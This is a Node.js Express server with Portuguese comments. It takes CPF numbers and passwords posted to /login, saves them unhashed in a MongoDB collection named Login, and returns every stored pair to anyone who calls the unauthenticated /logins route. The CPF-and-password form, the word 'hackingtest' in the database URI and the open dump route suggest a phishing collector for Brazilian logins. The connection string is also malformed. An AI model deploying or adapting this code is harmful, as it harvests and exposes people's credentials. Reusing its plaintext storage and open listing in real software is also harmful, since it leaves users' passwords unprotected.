const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Conecte aqui sua string do MongoDB Atlas (troque <usuario>, <senha>, <banco>)
const mongoURI = 'mongodb+srv://<dansaraiva23>:<@hackingtest.pf4jqlh.mongodb.net>@cluster0.abcdef.mongodb.net/<banco>?retryWrites=true&w=majority';

mongoose.connect(mongoURI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
}).then(() => {
  console.log('Conectado ao MongoDB Atlas!');
}).catch((err) => {
  console.error('Erro ao conectar no MongoDB:', err);
});

// Definindo schema e modelo
const loginSchema = new mongoose.Schema({
  cpf: { type: String, required: true },
  senha: { type: String, required: true },
});

const Login = mongoose.model('Login', loginSchema);

// Rota para salvar login no MongoDB
app.post('/login', async (req, res) => {
  try {
    const { cpf, senha } = req.body;

    if (!cpf || !senha) {
      return res.status(400).json({ message: 'CPF e senha são obrigatórios.' });
    }

    const novoLogin = new Login({ cpf, senha });
    await novoLogin.save();

    console.log('Login salvo:', novoLogin);
    return res.json({ message: 'Login salvo com sucesso!' });
  } catch (error) {
    console.error('Erro ao salvar login:', error);
    return res.status(500).json({ message: 'Erro inesperado no servidor.' });
  }
});

// Rota de teste para listar logins
app.get('/logins', async (req, res) => {
  try {
    const logins = await Login.find();
    res.json(logins);
  } catch (error) {
    res.status(500).json({ message: 'Erro ao buscar logins' });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
